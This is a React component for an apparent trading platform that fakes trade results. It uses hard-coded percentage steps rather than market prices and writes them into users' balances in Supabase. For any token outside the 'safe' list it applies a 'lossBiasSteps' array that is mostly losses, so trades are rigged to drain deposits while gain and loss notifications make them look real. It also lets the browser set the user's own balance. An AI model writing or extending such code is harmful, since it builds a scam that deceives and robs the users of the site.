import React, { useEffect } from "react";
import { User } from "@supabase/supabase-js";
import { toast } from "sonner";
import { supabase } from "@/lib/supabaseClient";

interface MarketProps {
  user: User;
  amount: number;
  tradeType: "buy" | "sell";
  baseSymbol: string;
  pair: string;
  onComplete: () => void;
  onFail?: () => void;
}

const Market7: React.FC<MarketProps> = ({
  user,
  amount,
  tradeType,
  baseSymbol,
  pair,
  onComplete,
  onFail,
}) => {
  useEffect(() => {
    const safeTokens = ["btc", "xrp", "sol"];
    const isSafe = safeTokens.includes(baseSymbol.toLowerCase());

    const fairSteps = [
      0.0009, -0.133, 0.137, 0.193, -0.12, 0.313, -0.08, 0.25,
      -0.13, 0.4, 0.1, -0.05, 0.12, 0.17, -0.1, 0.112,
    ];

    const lossBiasSteps = [
      -0.2, -0.15, -0.3, -0.1, -0.25, 0.1, -0.4, -0.05,
      -0.18, 0.05, -0.1, -0.12, 0.07, -0.22, -0.09, 0.03,
    ];

    const steps = isSafe ? fairSteps : lossBiasSteps;
    const shuffled = [...steps].sort(() => Math.random() - 0.5);
    const stepsToUse = shuffled.filter(() => Math.random() > 0.2);

    let currentStep = 0;
    let totalChange = 0;
    let isCancelled = false;
    let currentBalance = 0;

    window.__stopTrade = () => {
      isCancelled = true;
    };

    const fetchBalanceAndStart = async () => {
      const { data, error } = await supabase
        .from("profiles")
        .select("fiat_balance")
        .eq("id", user.id)
        .single();

      if (error || !data) {
        toast.error("Failed to fetch balance.");
        onFail?.();
        return;
      }

      currentBalance = data.fiat_balance || 0;

      if (currentBalance < amount) {
        toast.error("Insufficient balance.");
        onFail?.();
        return;
      }

      runStep();
    };

    const runStep = async () => {
      if (isCancelled || currentStep >= stepsToUse.length) {
        finalizeTrade();
        return;
      }

      const rawPercent = stepsToUse[currentStep];
      const stepPercent = tradeType === "buy" ? rawPercent : -rawPercent;

      const changeAmount = amount * stepPercent;
      totalChange += changeAmount;
      currentBalance += changeAmount;

      const { error: updateError } = await supabase
        .from("profiles")
        .update({ fiat_balance: currentBalance })
        .eq("id", user.id);

      if (updateError) {
        toast.error("Failed to update balance mid-trade.");
        onFail?.();
        return;
      }

      toast(
        `${stepPercent >= 0 ? "📈 Gain" : "📉 Loss"}: $${Math.abs(
          changeAmount
        ).toFixed(2)}`,
        {
          style: {
            backgroundColor: stepPercent >= 0 ? "#22c55e" : "#ef4444",
            color: "#fff",
          },
        }
      );

      currentStep++;
      const delay = Math.floor(Math.random() * 4300) + 1000;
      setTimeout(runStep, delay);
    };

    const finalizeTrade = async () => {
      const netChange = Number(totalChange.toFixed(2));

      // Ensure final balance is saved (in case of small errors)
      const { error: finalUpdateError } = await supabase
        .from("profiles")
        .update({ fiat_balance: Math.max(0, currentBalance) })
        .eq("id", user.id);

      if (finalUpdateError) {
        toast.error("Final balance update failed.");
        onFail?.();
        return;
      }

      // Log trade
      await supabase.from("recent_trades").insert({
        user_id: user.id,
        currency_pair: pair.replace("/", "").toUpperCase(),
        amount,
        trade_type: tradeType,
        gain_loss: netChange,
      });

      const summary =
        netChange >= 0
          ? `Profit: $${netChange.toFixed(2)}`
          : `Loss: $${Math.abs(netChange).toFixed(2)}`;

      toast.success(`✅ Trade completed.\n${summary}`, {
        style: {
          backgroundColor: "#0f172a",
          color: "#fff",
          whiteSpace: "pre-line",
        },
      });

      onComplete();
    };

    fetchBalanceAndStart();
  }, []);

  return null;
};

export default Market7;
